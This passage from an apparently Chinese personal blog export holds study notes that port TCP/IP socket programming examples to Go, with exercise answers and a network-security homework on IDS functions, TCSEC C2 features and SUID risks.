中，需要手动进行这些操作。\n1func bind(s int, addr unsafe.Pointer, addrlen _Socklen) (err error) { 2\t_, _, e1 := syscall(abi.FuncPCABI0(libc_bind_trampoline), uintptr(s), uintptr(addr), uintptr(addrlen)) 3\tif e1 != 0 { 4\terr = errnoErr(e1) 5\t} 6\treturn 7} 在 Go 语言的 syscall 包中，Bind 和 bind 函数都是用来将本地协议地址绑定到文件描述符的。 bind 函数是一个私有的函数，它直接接受一个文件描述符和一个 unsafe.Pointer 类型的地址作为参数，然后调用系统调用 bind。这个函数通常不会直接被用户代码调用，而是被 Bind 函数调用。 bind 函数是通过 syscall 函数调用 libc_bind_trampoline 函数来实现的，这个函数是一个跳板函数，它会跳转到动态链接库中的 bind 函数。 总的来说，Bind 函数提供了一个更高级的接口，它处理了类型转换和错误处理，而 bind 函数是一个更底层的接口，它直接调用系统调用。\n3.5 基于Windows的实现 略\n3.6 习题 IP地址族IPv4和IPv6有何区别?在何种背景下诞生了IPv6?\nIPv4与IPv6的差别主要是表示IP地址所用的字节数,目前通用的地址族为IPv4。IPv6是为了应对2010年前后IP地址耗尽的问题而提出的标准。\n通过IPv4网络ID、主机ID及路由器的关系说明向公司局域网中的计算机传输数据的过程。\n网络地址(网络ID)是为区分网络而设置的一部分IP地址。假设向WWW.SEMI.COM公司传输数据,该公司内部构建了局域网,把所有计算机连接起来。因此,首先应向SEMI.COM网络传输数据,也就是说,并非一开始就浏览所有4字节IP地址,进而找到目标主机;而是仅浏览4字节IP地址的网络地址,先把数据传到SEMI.COM的网络。SEMI.COM网络(构成网络的路由器)接收到数据后,浏览传输数据的主机地址(主机ID)并将数据传给目标计算机。\n套接字地址分为IP地址和端口号。为什么需要地址和端口号?或者说,通过IP可以区分哪些对象?通过端口号可以区分哪些对象?\n套接字地址分为IP地址和端口号，是为了在网络中唯一标识一个通信端点。IP地址用于区分不同的主机，即不同的计算机。端口号用于区分同一主机上的不同进程，即不同的应用程序。\n请说明IP地址的分类方法,并据此说出下面这些IP地址的分类。 214.121.212.102 （C类） 120.101.122.89 （A类） 129.78.102.211 （B类） 计算机通过路由器或交换机连接到互联网。请说出路由器和交换机的作用。\n若想构建网络,需要一种物理设备完成外网与本网主机之间的数据交换,这种设备便是路由器或交换机。\n什么是知名端口?其范围是多少?知名端口中具有代表性的HTTP和FTP端口号各是多少?\n0-1023是知名端口(Well-known PORT),一般分配给特定应用程序。HTTP的端口号是80，FTP的端口号是21\n向套接字分配地址的bind函数原型如下: int bind(int sockfd, struct sockaddr *myaddr,socklen_t addrlen); 而调用时则用bind(serv_sock,(struct sockaddr *)\u0026amp;sery_addr, sizeof (serv_addr)); 此处serv_addr为sockaddr_in结构体变量。与函数原型不同,传入的是sockaddr_in结构体变量,请说明原因。\nsockaddr_in 结构体是 sockaddr 结构体的一种特定类型，因此可以通过类型转换将其传递给 bind 函数。这是因为 sockaddr_in 结构体包含了 sockaddr 结构体的所有成员，所以在实际调用中可以将 sockaddr_in 结构体的指针转换为 sockaddr 结构体的指针，从而符合 bind 函数的参数要求。\n请解释大端序、小端序、网络字节序,并说明为何需要网络字节序。\n大端序（Big-Endian）：数据的低位字节存储在内存的低地址，高位字节存储在内存的高地址。 小端序（Little-Endian）：数据的高位字节存储在内存的低地址，低位字节存储在内存的高地址。 网络字节序（Network Byte Order）：是指在网络传输中采用的字节序。网络字节序采用大端序，这是因为大端序与人类阅读数字的顺序一致，因此更容易理解和识别。 网络字节序是网络传输的标准，因此在网络传输中采用网络字节序可以确保数据在不同计算机之间正确传输。 大端序计算机希望把4字节整数型数据12传递到小端序计算机。请说出数据传输过程中发生的字节序变换过程。\n数据 12 在网络传输过程中的字节序没有发生变化，仍然是大端序。小端序计算机在接收到数据后，需要将数据中的高位字节和低位字节进行交换，以将数据转换为小端序。\n大端序 网络字节序 小端序 0x0000000C 0x0000000C 0x0C000000 怎样表示回送地址?其含义是什么?如果向回送地址传输数据将发生什么情况? 回送地址（loopback address）是指本地主机的 IP 地址。在 IPv4 中，回送地址为 127.0.0.1。 回送地址用于本地主机之间的通信。如果向回送地址传输数据，则数据将会被本地主机接收并处理。 ","date":"2023-11-15T20:09:07+08:00","permalink":"https://anonymity-0.github.io/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%B8%89%E7%AB%A0%E7%AC%94%E8%AE%B0/","title":"TCP、IP网络编程第三章笔记"},{"content":"得分：10/10\n第六讲 IDS有哪些主要功能?\n网络流量的跟踪与分析功能：跟踪用户进出网络的所有活动，实时检测并分析用户在系统中的活动状态；实时统计网络流量，检测拒绝服务攻击等异常行为。\n已知攻击特征的识别功能：识别特定类型的攻击，并向控制台报警，为网络防护提供依据。根据定制的条件过滤重复告警事件，减轻传输与响应的压力。\n异常行为的分析、统计与响应功能：分析系统的异常行为模式，统计异常行为，并对异常行为做出响应。\n特征库的在线和离线升级功能：提供入侵检测规则的在线和离线升级，实时更新入侵特征库，不断提高IDS的入侵检测能力。\n数据文件的完整性检查功能：检查关键数据文件的完整性，识别并报告数据文件的改动情况。\n自定义的响应功能：定制实时响应策略；根据用户定义，经过系统过滤，对告警事件及时响应。\n系统漏洞的预报警功能：对新发现或新公布的系统漏洞特征进行预报警。\nIDS探测器集中管理功能：通过控制台收集探测器的状态和告警信息，控制各个探测器的行为。\n简述误用检测和异常检测。\n误用检测技术又称基于知识或特征的检测技术。它假定所有入侵行为和手段(及其变种)都能够表达为一种模式或特征，并对已知的入侵行为和手段进行分析，提取入侵特征，构建攻击模式或攻击签名，通过系统当前状态与攻击模式或攻击签名的匹配判断入侵行为。误用检测是最成熟、应用最广泛的技术。 异常检测技术又称为基于行为的入侵检测技术，用来检测系统（主机或网络）中的异常行为。 总结NIDS的脆弱性。\n检测的工作量很大：NIDS需要高效的检测方法和大量的系统资源。容易遭受DoS攻击。 检测方法局限性：特征匹配方法有其固有缺陷，难以完全检测入侵行为。 网络协议复杂性：NIDS难以精确分析复杂的网络协议。 系统实现差异：NIDS难以完全兼容不同系统的实现方式。 简述网络安全态势感知系统。\n网络安全态势感知系统可以看成是基于分布式入侵检测系统的综合安全监控系统，具有入侵检测、安全状态可视化展示、安全状态理解及趋势分析预测，以及网络监视和网络控制等功能。\n第七讲 简述TCSEC(受信计算机系统评测标准)标准的C2安全级4项关键功能。\n安全登录机制 要求系统提供强大的用户身份验证机制，防止未经授权的用户登录系统。\n自主访问控制机制 要求系统提供自主访问控制机制，允许系统管理员根据需要对系统资源进行访问控制。\n安全审计机制 系统必须提供安全审计机制，以记录系统的关键操作，以便在发生安全事件时进行调查。\n对象重用保护机制 对象重用保护机制就是残留信息的处理机制，即：阻止一个用户利用或阅读另一个用户已删除的数据，或访问另一个用户曾经使用并释放的内存。\n在哪些情况下可能会发生输入验证攻击。\n程序无法辨认语法上不正确的输入。 模块接受了无关的输入。 模块没有能够处理遗漏的输入域。 发生了域值相关性错误。 为什么root对其可执行文件设置用户ID许可会带来严重的安全隐患?\n因为当某可执行文件是root创建的，如果设置了SUID，而该可执行文件又被赋予了其他普通用户的可执行权限，则该程序被任何用户运行时，对应的进程的euid是root，该进程可以访问任何文件。\n","date":"2023-11-15T18:44:57+08:00","permalink":"https://anonymity-0.github.io/posts/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%BD%9C%E4%B8%9A4/","title":"网络安全作业4"},{"content":"2.1 套接字协议及其数据传输特性 协议 如果相隔很远的两人想展开对话,必须先决定对话方式。如果一方使用电话,那么另一方也只能使用电话,而不是书信。可以说,电话就是两人对话的协议。协议是对话中使用的通信规则, 把上述概念拓展到计算机领域可整理为“计算机间对话必备通信规则”。\n创建套接字 1#include \u0026lt;sys/socket.h\u0026gt; 2int socket (int domain, int type, int protocol); 3//成功时返回文件描述符,失败时返回-1。 4//domain 套接字中使用的协议族(Protocol Family)信息。 5//type 套接字数据传输类型信息。 6//protocol 计算机间通信中使用的协议信息。 在 Go 语言的 syscall 包中，Socket 函数是对底层 socket 系统调用的封装。这样做的目的是为了提供一个更加 Go 风格（例如错误处理）的接口，同时隐藏一些底层细节。\nSocket 函数内部调用了 socket 函数。socket 函数直接执行了系统调用，并返回了原始的结果，包括一个文件描述符和一个错误号。然后 Socket 函数将这些原始结果转换为 Go 风格的结果：如果系统调用成功，它返回一个文件描述符和一个 nil 错误；如果系统调用失败，它返回一个 -1 文件描述符和一个非 nil 错误。\n这样做的好处是，对于大多数 Go 程序员来说，他们只需要关心 Socket 函数，而不需要了解底层的 socket 系统调用和错误处理。\n1// Socket 函数创建一个新的套接字，并返回其文件描述符和可能的错误。 2// domain 参数指定了套接字的协议族（例如，AF_INET 代表 IPv4，AF_INET6 代表 IPv6）。 3// typ 参数指定了套接字的类型（例如，SOCK_STREAM 代表 TCP，SOCK_DGRAM 代表 UDP）。 4// proto 参数指定了套接字使用的协议（例如，IPPROTO_TCP 代表 TCP，IPPROTO_UDP 代表 UDP）。 5func Socket(domain, typ, proto int) (fd int, err error) { 6 // 如果 domain 是 AF_INET6（即，我们正在尝试创建一个 IPv6 套接字）， 7 // 但是 SocketDisableIPv6 为 true（即，我们禁用了 IPv6），则返回错误 EAFNOSUPPORT。 8 if domain == AF_INET6 \u0026amp;\u0026amp; SocketDisableIPv6 { 9 return -1, EAFNOSUPPORT 10 } 11 // 调用底层的 socket 函数创建套接字。 12 fd, err = socket(domain, typ, proto) 13 return 14} 15 16 17 18 19// socket 函数创建一个新的套接字，并返回其文件描述符和可能的错误。 20// domain 参数指定了套接字的协议族（例如，AF_INET 代表 IPv4，AF_INET6 代表 IPv6）。 21// typ 参数指定了套接字的类型（例如，SOCK_STREAM 代表 TCP，SOCK_DGRAM 代表 UDP）。 22// proto 参数指定了套接字使用的协议（例如，IPPROTO_TCP 代表 TCP，IPPROTO_UDP 代表 UDP）。 23// rawSyscall 函数执行一个底层的系统调用，其参数是系统调用的编号和参数。 24// 如果系统调用失败，它返回一个非零的错误号 e1，我们将其转换为 Go 的 error 类型并返回。 25func socket(domain int, typ int, proto int) (fd int, err error) { 26 r0, _, e1 := rawSyscall(abi.FuncPCABI0(libc_socket_trampoline), uintptr(domain), uintptr(typ), uintptr(proto)) 27 fd = int(r0) 28 if e1 != 0 { 29 err = errnoErr(e1) 30 } 31 return 32} 协议族(Protocol Family) 通过socket函数的第一个参数传递套接字中使用的协议分类信息。此协议分类信息称为协议族。 原文给的c语言头文件中的分类 在 Go 语言的 syscall 包中，domain 参数用于指定套接字的协议族。以下是一些常见的 domain 值：\n值 描述 AF_INET IPv4 网络协议 AF_INET6 IPv6 网络协议 AF_UNIX UNIX 域套接字 AF_NETLINK 内核用户接口设备 AF_PACKET 低级包接口 AF_CAN Controller Area Network AF_BLUETOOTH 蓝牙设备 请注意，不是所有的 domain 值都在所有的平台上可用。具体可用的 domain 值取决于你的操作系统和平台。\n套接字类型(Type) 套接字类型指的是套接字的数据传输方式,通过socket函数的第二个参数传递,只有这样才能决定创建的套接字的数据传输方式。这种说法可能会使各位感到疑惑。已通过第一个参数传递了协议族信息,还要决定数据传输方式?问题就在于,决定了协议族并不能同时决定数据传输方式,换言之,socket数第一个参数PF_INET协议族中也存在多种数据传输方式。\n面向连接的套接字(SOCK_STREAM) 如果向socket函数的第二个参数传递SOCK_STREAM,将创建面向连接的套接字。面向连接的套接字到底具有哪些特点呢?\n套接字连接必须一一对应 传输过程中数据不会消失 按序传输数据 传输的数据不存在数据边界 收发数据的套接字内部有缓冲(buffer),简言之就是字节数组。通过套接字传输的数据将保存到该数组。因此,收到数据并不意味着马上调用read函数。只要不超过数组容量,则有可能在数据填充满缓冲后通过1次read函数调用读取全部,也有可能分成多次read函数调用进行读取。也就是说,在面向连接的套接字中,read函数和write函数的调用次数并无太大意义。所以说面向连接的套接字不存在数据边界。\n套接字缓冲已满是否意味着数据丢失 之前讲过,为了接收数据,套接字内部有一个由字节数组构成的缓冲。如果这个缓冲被接收的数据填满会发生什么事情?之后传递的数据是否会丢失? 首先调用read函数从缓冲读取部分数据,因此,缓冲并不总是满的。但如果read函数读取速度比接收数据的速度慢,则缓冲有可能被填满。此时套接字无法再接收数据, 但即使这样也不会发生数据丢失,因为传输端套接字将停止传输。也就是说,面向连接的套接字会根据接收端的状态传输数据,如果传输出错还会提供重传服务。因此,面向连接的套接字除特殊情况外不会发生数据丢失。\n面向消息的套接字(SOCK_DGRAM) 如果向socket函数的第二个参数传递SOCK_DGRAM,则将创建面向消息的套接字。面向消息的套接字可以比喻成高速移动的摩托车快递。\n强调快速传输而非传输顺序 传输的数据可能丢失也可能损毁 传输的数据有数据边界 限制每次传输的数据大小 众所周知,快递行业的速度就是生命。用摩托车发往同一目的地的2件包裹无需保证顺序, 只要以最快速度交给客户即可。这种方式存在损坏或丢失的风险,而且包裹大小有一定限制。因此,若要传递大量包裹,则需分批发送。另外,如果用2辆摩托车分别发送2件包裹,则接收者也需要分2次接收。这种特性就是“传输的数据具有数据边界”。\n面向消息的套接字比面向连接的套接字具有更快的传输速度,但无法避免数据丢失或损毁。另外,每次传输的数据大小具有一定限制,并存在数据边界。存在数据边界意味着接收数据的次数应和传输次数相同。面向消息的套接字特性总结如下: “不可靠的、不按序传递的、以数据的高速传输沟目的的套接字\u0026quot;\n最终选择的协议 下面讲解socket函数的第三个参数,该参数决定最终采用的协议。 前面已经通过socket函数的前两个参数传递了协议族信息和套接字数据传输方式,这些信息还不足以决定采用的协议吗?为什么还需要传递第3个参数呢? 传递前两个参数即可创建所需套接字。所以大部分情况下可以向第三个参数传递0,除非遇到以下这种情况: “同一协议族中存在多个数据传输方式相同的协议”数据传输方式相同,但协议不同。此时需要通过第三个参数具体指定协议信息。\nTCP套接字示例 tcp_server.go (系统函数调用版)\n1package main 2 3import ( 4\t\u0026#34;fmt\u0026#34; 5\t\u0026#34;log\u0026#34; 6\t\u0026#34;os\u0026#34; 7\t\u0026#34;strconv\u0026#34; 8\t\u0026#34;syscall\u0026#34; 9) 10 11func main() { 12\tif len(os.Args) != 2 { 13\tfmt.Printf(\u0026#34;Usage: %s \u0026lt;port\u0026gt;\\n\u0026#34;, os.Args[0]) 14\t} 15\tport, _ := strconv.Atoi(os.Args[1]) 16 17\t//1.创建一个 TCP 套接字。 18\tfd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0) 19\tif err != nil { 20\tfmt.Printf(\u0026#34;socket() error: %v\u0026#34;, err) 21\t} 22\t//2.将套接字绑定到指定的 IP 地址和端口号。 23\t// 创建一个 SockaddrInet4 结构体实例，并设置端口号 24\tservAddr := \u0026amp;syscall.SockaddrInet4{Port: port} 25\t// 将 IP 地址设置为 0.0.0.0，这样服务器可以接受来自任何客户端的连接 26\tcopy(servAddr.Addr[:], []byte{0, 0, 0, 0}) 27 28\terr = syscall.Bind(fd, servAddr) 29\tif err != nil { 30\tlog.Fatalf(\u0026#34;bind() error: %v\u0026#34;, err) 31\t} 32\t//3.将套接字转为可接收连接状态 33\terr = syscall.Listen(fd, 10) 34\tif err != nil { 35\tlog.Fatalf(\u0026#34;listen() error: %v\u0026#34;, err) 36\t} 37\t//4.Accept()接收连接 38\tconnFd, _, err := syscall.Accept(fd) 39\tif err != nil { 40\tlog.Fatalf(\u0026#34;accept() error: %v\u0026#34;, err) 41\t} 42\t//5.write()发送信息 43\tmessage := \u0026#34;Hello world!\u0026#34; 44\t_, err = syscall.Write(connFd, []byte(message)) 45\tif err != nil { 46\tlog.Fatalf(\u0026#34;write() error: %v\u0026#34;, err) 47\t} 48\tsyscall.Close(connFd) 49\tsyscall.Close(fd) 50 51} tcp_clinet.go 更改read函数调用方式，在客户端中分多次调用read函数以接收服务器端发送的全部数据,以验证tcp传输的数据不存在数据边界。\n1package main 2 3import ( 4\t\u0026#34;fmt\u0026#34; 5\t\u0026#34;io\u0026#34; 6\t\u0026#34;log\u0026#34; 7\t\u0026#34;net\u0026#34; 8\t\u0026#34;os\u0026#34; 9\t\u0026#34;strconv\u0026#34; 10\t\u0026#34;syscall\u0026#34; 11) 12 13func main() { 14\tif len(os.Args) != 3 { 15\tlog.Fatalf(\u0026#34;Usage: %s \u0026lt;IP\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;, os.Args[0]) 16\t} 17\tip := os.Args[1] 18\tportStr := os.Args[2] 19 20\tport, err := strconv.Atoi(portStr) 21\tif err != nil { 22\tlog.Fatalf(\u0026#34;Invalid port number: %s\\n\u0026#34;, portStr) 23\t} 24 25\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0) 26\t// 设置服务器的地址和端口 27\tservAddr := \u0026amp;syscall.SockaddrInet4{Port: port} 28\tcopy(servAddr.Addr[:], net.ParseIP(ip).To4()) 29 30\t// 使用 syscall.Connect 函数将套接字连接到服务器 31\terr = syscall.Connect(fd, servAddr) 32\tif err != nil { 33\tlog.Fatalf(\u0026#34;connect() error: %v\u0026#34;, err) 34\t} 35\t// 使用 syscall.Read 接收信息 36\tbuf := make([]byte, 1024) 37\tmessage := make([]byte, 0) 38\tfor { 39\tn, err := syscall.Read(fd, buf) 40\tif err != nil { 41\tif err != io.EOF { 42\tlog.Fatalf(\u0026#34;Read error: %v\u0026#34;, err) 43\t} 44\tbreak 45\t} 46\tif n == 0 { 47\tbreak 48\t} 49\tmessage = append(message, buf[:n]...) 50\t} 51\tfmt.Printf(\u0026#34;Message from server: %s\\n\u0026#34;, message) 52\tfmt.Printf(\u0026#34;Function read() read %d bytes\\n\u0026#34;, len(message)) 53\tsyscall.Close(fd) 54 55} 运行\n1go build -o ch2/tcpServer/tcp_server ch2/tcpServer/tcp_server.go 2go build -o ch2/tcpClient/tcp_client ch2/tcpClient/tcp_client.go 3 4./ch2/tcpServer/tcp_server 8888 5./ch2/tcpClient/tcp_client 127.0.0.1 8888 6 7Message from server: Hello world! 8Function read() read 12 bytes 2.2 Windows平台啊下的实现及验证 略\n2.3 习题 什么是协议?在收发数据中定义协议有何意义?\n面向连接的TCP套接字传输特性有3点,请分别说明。\n无数据边界 传输过程中数据不会消失 按序传输 下列哪些是面向消息的套接字的特性? a. 传输数据可能丢失 b. 没有数据边界(Boundary) （面向连接） c. 以快速传递为目标 d. 不限制每次传递数据的大小 （限制大小） e. 与面向连接的套接字不同,不存在连接的概念\n下列数据适合用哪类套接字传输?并给出原因。\na. 演唱会现场直播的多媒体数据(面向消息) 因为面向消息的套接字以快速传递为目标，适合传输多媒体数据，即使传输数据可能丢失也不会影响整体效果。 b. 某人压缩过的文本文件(面向连接) 因为面向连接的套接字可以保证数据的可靠传输，适合传输对数据完整性要求较高的文本文件。 c. 网上银行用户与银行之间的数据传递(面向连接) 面向连接的套接字提供可靠的、按顺序传送的数据传输服务，适合对数据完整性和安全性要求较高的网上银行交易。 何种类型的套接字不存在数据边界?这类套接字接收数据时需要注意什么? 面向连接的套接字不存在数据边界。面向连接的TCP套接字在接收数据时需要注意处理粘包和拆包的问题，确保按照应用层协议的要求正确解析和处理接收到的数据\ntcp_server.c和tcp_client.c中需多次调用read函数读取服务器端调用I次write函数传递的字符串。更改程序,使服务器端多次调用(次数自拟)write函数传输数据,客户端调用1 次read函数进行读取。为达到这一目的,客户端需延迟调用read函数,因为客户端要等待服务器端传输所有数据。Windows和Linux都通过下列代码延迟read或recv函数的调用。for(1=0;i\u0026lt;3000;i++) printf(\u0026ldquo;wait time %d \\n\u0026rdquo;, i); 让CPU执行多余任务以延迟代码运行的方式称为 “Busy Waiting”。使用得当即可推迟函数调用。\n","date":"2023-11-11T12:48:30+08:00","permalink":"https://anonymity-0.github.io/posts/tcpip%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B%E7%AC%AC%E4%BA%8C%E7%AB%A0%E7%AC%94%E8%AE%B0/","title":"TCP、IP网络编程第二章笔记"},{"content":"1.1 理解网络和套接字 套接字 套接字（socket）是计算机网络中进程间通信的一种机制，它将进程间通信抽象为一个端点，该端点由一个IP地址和一个端口号来标识。 套接字是网络数据传输用的软件设备。网络编程又称为套接字编程。\n编写\u0026quot; Hello world! \u0026quot; 服 务 器 端 网络编程中接受连接请求的套接字创建过程可整理如下。\n第一步:调用s o c k e t 函数创建套接字。 第二步:调用b i n d 函数分配E地址和端口号。 第三步:调用l i s t e n 函数转为可接收请求状态。 第四步:调用a c c e p t 函数受理连接请求。 hello_server.go\n1package main 2 3import ( 4\t\u0026#34;log\u0026#34; 5\t\u0026#34;net\u0026#34; 6\t\u0026#34;os\u0026#34; 7) 8 9func main() { 10 11\t//检查参数 12\tif len(os.Args) != 2 { 13\tlog.Fatalf(\u0026#34;Usage: %s \u0026lt;port\u0026gt;\\n\u0026#34;, os.Args[0]) 14\t} 15\t//设置监听端口和信息 16\tmessage := \u0026#34;Hello world!\u0026#34; 17\tport := os.Args[1] 18 19\t//当你调用 net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:\u0026#34;+port) 时，Go 会执行以下操作： 20\t//1.创建一个 TCP 套接字。 21\t//2.将套接字绑定到指定的 IP 地址和端口号。 22\t//3.将套接字转为可接收连接状态 23\tlistener, err := net.Listen(\u0026#34;tcp\u0026#34;, \u0026#34;:\u0026#34;+port) 24\tif err != nil { 25\tlog.Fatalf(\u0026#34;socket() error: %v\u0026#34;, err) 26\t} 27\t//延迟关闭监听 28\tdefer listener.Close() 29\t//循环监听 30\tfor { 31\t//4.Accept()接收连接 32\tconn, err := listener.Accept() 33\tif err != nil { 34\tlog.Fatalf(\u0026#34;accept() error: %v\u0026#34;, err) 35\t} 36\t//5.write()发送信息 37\t_, err = conn.Write([]byte(message)) 38\tif err != nil { 39\tlog.Fatalf(\u0026#34;write() error: %v\u0026#34;, err) 40 41\t} 42 43\tconn.Close() 44\t} 45 46} client 创建套接字,但此时套接字并不马上分为服务器端和客户端。如果紧接着调用bind和listen函数,将成为服务器端套接字;如果调用connect函数将成为客户端套接字。\nhello_client.go\n1package main 2 3import ( 4\t\u0026#34;fmt\u0026#34; 5\t\u0026#34;io\u0026#34; 6\t\u0026#34;log\u0026#34; 7\t\u0026#34;net\u0026#34; 8\t\u0026#34;os\u0026#34; 9) 10 11func main() { 12\tif len(os.Args) != 3 { 13\tlog.Fatalf(\u0026#34;Usage: %s \u0026lt;IP\u0026gt; \u0026lt;port\u0026gt;\\n\u0026#34;, os.Args[0]) 14\t} 15 16\tip := os.Args[1] 17\tport := os.Args[2] 18\taddress := fmt.Sprintf(\u0026#34;%s:%s\u0026#34;, ip, port) 19\t//1.创建一个 TCP 套接字。 20\t//2.调用 Connect() 连接到指定的 IP 地址和端口号。 21\tconn, err := net.Dial(\u0026#34;tcp\u0026#34;, address) 22\tif err != nil { 23\tlog.Fatalf(\u0026#34;Failed to connect to server: %v\u0026#34;, err) 24\t} 25\tdefer conn.Close() 26\t//net.Conn 对象来读取服务器发送的消息 27\tmessage, err := io.ReadAll(conn) 28\tif err != nil { 29\tlog.Fatalf(\u0026#34;Failed to read from server: %v\u0026#34;, err) 30\t} 31 32\tfmt.Printf(\u0026#34;Message from server: %s\\n\u0026#34;, message) 33} 运行 编译运行服务器 1go build -o ch1/hello_server ch1/hello_server.go 2./ch1/hello_server 8080 编译运行客户端 1go build -o ch1/hello_client ch1/hello_client/hello_client.go 2 3 4./ch1/hello_client 127.0.0.1 8080 5Message from server: Hello world! 1.2 文件操作 打开文件 首先介绍打开文件以读写数据的函数。 调用此函数时需传递两个参数:第一个参数是打开的目标文件名及路径信息,第二个参数是文件打开模式(文件特性信息)。\n1#include \u0026lt;sys/types.h\u0026gt; 2#include \u0026lt;sys/stat.h\u0026gt; 3#include \u0026lt;fcntl.h\u0026gt; 4int open(const char * path ，int flag) 5//成功时返回文件描述符事失败时返回1 6//path 文件名字符串地址 7//flag 文件打开模式 1func Open(name string) (*File, error) { 2\treturn OpenFile(name, O_RDONLY, 0) 3} 4 5// OpenFile 是一个通用的文件打开函数，它接受三个参数：文件名、打开文件的标志和文件权限。 6// 它返回一个 *os.File 对象和一个 error 对象。如果打开文件失败，它会返回一个非 nil 的 error 对象。 7func OpenFile(name string, flag int, perm FileMode) (*File, error) { 8 // 记录打开文件的操作 9 testlog.Open(name) 10 // 使用 openFileNolog 函数打开文件，这个函数不记录日志 11 f, err := openFileNolog(name, flag, perm) 12 // 如果打开文件失败，返回错误 13 if err != nil { 14 return nil, err 15 } 16 // 检查打开文件的标志是否包含 O_APPEND，如果包含，设置 f.appendMode 为 true 17 f.appendMode = flag\u0026amp;O_APPEND != 0 18 19 // 返回打开的文件 20 return f, nil 21} 关闭文件 1#include \u0026lt;unistd.h\u0026gt; 2int close(int fd); 3\t//成功时返回Q,失败时返回-1。 4//fd:需要关闭的文件或套接字的文件描述符 1// Close closes the File, rendering it unusable for I/O. 2// On files that support SetDeadline, any pending I/O operations will 3// be canceled and return immediately with an ErrClosed error. 4// Close will return an error if it has already been called. 5func (f *File) Close() error { 6\tif f == nil { 7\treturn ErrInvalid 8\t} 9\treturn f.file.close() 10} 将数据写入文件 1#include \u0026lt;unistd.h\u0026gt; 2ssize_t write(int fd, const void * buf, size_t nbytes); 3//成功时返回写入的字节数,失败时返回-1。 4//fd:数据传输对象的文件描述符 5//buf 保存数据的缓冲地址 6//nbytes：要传输的字节数 1// write writes len(b) bytes to the File. 2// It returns the number of bytes written and an error, if any. 3// write 是 File 结构体的一个方法，它接受一个字节切片 b 作为参数， 4// 尝试将这个字节切片写入到文件中。 5func (f *File) write(b []byte) (n int, err error) { 6 // f.pfd.Write(b) 调用 pfd（代表平台依赖的文件描述符）的 Write 方法， 7 // 尝试将 b 写入到文件。这个方法返回写入的字节数和一个错误（如果有的话）。 8 n, err = f.pfd.Write(b) 9 // runtime.KeepAlive(f) 是一个用于防止 f 被垃圾回收的调用。 10 // 在某些情况下，如果 f 在 f.pfd.Write(b) 调用之后没有被再次使用， 11 // Go 的垃圾回收器可能会在 Write 调用还在进行时就回收 f。 12 // runtime.KeepAlive(f) 确保 f 在 Write 调用完成之前不会被垃圾回收。 13 runtime.KeepAlive(f) 14 // 返回写入的字节数和错误（如果有的话） 15 return n, err 16} 代码示例改写 low_open.go\n1package main 2 3import ( 4\t\u0026#34;log\u0026#34; 5\t\u0026#34;os\u0026#34; 6) 7 8func main() { 9 10\tbuf := []byte(\u0026#34;Let\u0026#39;s go!\\n\u0026#34;) 11\t//打开文件，如果不存在则创建，如果存在则清空，权限为 0644 12\tf, err := os.OpenFile(\u0026#34;data.txt\u0026#34;, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644) 13\tif err != nil { 14\tlog.Fatalf(\u0026#34;open() error: %v\u0026#34;, err) 15\t} 16\tdefer f.Close() 17\t//输出文件描述符 18\tlog.Printf(\u0026#34;file descriptor: %d \\n\u0026#34;, f.Fd()) 19\t//写入文件 20\t_, err = f.Write(buf) 21\tif err != nil { 22\tlog.Fatalf(\u0026#34;write() error: %v\u0026#34;, err) 23\t} 24 25} 运行代码\n1go build -o ch1/low_open ch1/lowOpen/low_open.go 2./ch1/low_open 3file descriptor: 3 读取数据 1#include \u0026lt;unistd.h\u0026gt; 2ssize_t read(int fdJ void * buf, size_t nbytes); 3//\u0026#39;成功时返回接收的字节数(但遇到文件结尾则返回θ),失败时返回10 4//fd 显示数据接收对象的文件描述符。 5//buf 要保存接收数据的缓冲地址值。 6//nbytes 要接收数据的最大字节数。 示例代码改写 low_read.go\n1package main 2 3import ( 4\t\u0026#34;log\u0026#34; 5\t\u0026#34;os\u0026#34; 6) 7 8func main() { 9\t//只读打开文件 10\tf, err := os.Open(\u0026#34;data.txt\u0026#34;) 11\tif err != nil { 12\tlog.Fatalf(\u0026#34;open() error: %v\u0026#34;, err) 13\t} 14\tdefer f.Close() 15 16\t//输出文件描述符 17\tlog.Printf(\u0026#34;file descriptor: %d \\n\u0026#34;, f.Fd()) 18 19\t//读取文件 20\tbuf := make([]byte, 1024) 21\tn, err := f.Read(buf) 22\tif err != nil { 23\tlog.Fatalf(\u0026#34;read() error: %v\u0026#34;, err) 24\t} 25\tlog.Printf(\u0026#34;file data: %s\u0026#34;, buf[:n]) 26} 运行代码\n1go build -o ch1/low_read ch1/lowRead/low_read.go 2 3./ch1/low_read 42023/11/10 16:45:54 file descriptor: 3 52023/11/10 16:45:54 file data: Let\u0026#39;s go! 文件描述符与套接字 原文c代码\n1#include \u0026lt;stdio.h\u0026gt; 2#include \u0026lt;fcntl.h\u0026gt; 3#include \u0026lt;unistd.h\u0026gt; 4#include \u0026lt;sys/socket.h\u0026gt; 5 6int main() 7{ 8 int fd1, fd2, fd3; 9 //创建一个文件和两个套接字 10 fd1 = socket(PF_INET, SOCK_STREAM, 0); 11 fd2 = open(\u0026#34;test.dat\u0026#34;, O_CREAT | O_WRONLY | O_TRUNC); 12 fd3 = socket(PF_INET, SOCK_DGRAM, 0); 13 //输出之前创建的文件描述符的整数值 14 printf(\u0026#34;file descriptor 1: %d\\n\u0026#34;, fd1); 15 printf(\u0026#34;file descriptor 2: %d\\n\u0026#34;, fd2); 16 printf(\u0026#34;file descriptor 3: %d\\n\u0026#34;, fd3); 17 18 close(fd1); 19 close(fd2); 20 close(fd3); 21 return 0; 22} 改写后 fd_seri.go\n1import ( 2 \u0026#34;fmt\u0026#34; 3 \u0026#34;os\u0026#34; 4 \u0026#34;syscall\u0026#34; 5) 6 7func main() { 8 // 使用 syscall.Socket 函数创建一个 TCP 套接字，返回的是文件描述符 fd1 9 fd1, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0) 10 // 使用 os.OpenFile 函数创建一个文件 \u0026#34;test.dat\u0026#34;，返回的是 *os.File 类型的 fd2 11 fd2, _ := os.OpenFile(\u0026#34;test.dat\u0026#34;, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 